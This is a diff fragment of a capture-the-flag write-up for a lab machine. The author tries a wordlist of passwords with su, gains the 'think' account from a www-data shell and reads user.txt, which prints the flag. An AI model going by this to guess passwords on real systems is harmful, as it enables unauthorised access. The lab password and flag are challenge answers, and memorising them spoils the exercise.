@@ -536,3 +536,32 @@ jose.96.
 jose.9298
 jose.2856171
 ```
+
+> [!note]
+> After using su for all passwords for think, I eventually got it:
+
+```
+www-data@ip-10-66-172-224:/tmp$ su think
+su think
+Password: josemario.AKA(think)
+think@ip-10-66-172-224:/tmp$ 
+```
+
+> [!info]
+> Time to get user.txt!
+
+```
+think@ip-10-66-172-224:/tmp$ cd /home
+cd /home
+think@ip-10-66-172-224:/home$ cd /think
+cd /think
+bash: cd: /think: No such file or directory
+think@ip-10-66-172-224:/home$ cd think
+cacd think
+t think@ip-10-66-172-224:~$ user.txt
+cat user.txt
+38375fb4dd8baa2b2039ac03d92b820e
+```
+
+> [!important]
+> User flag = 
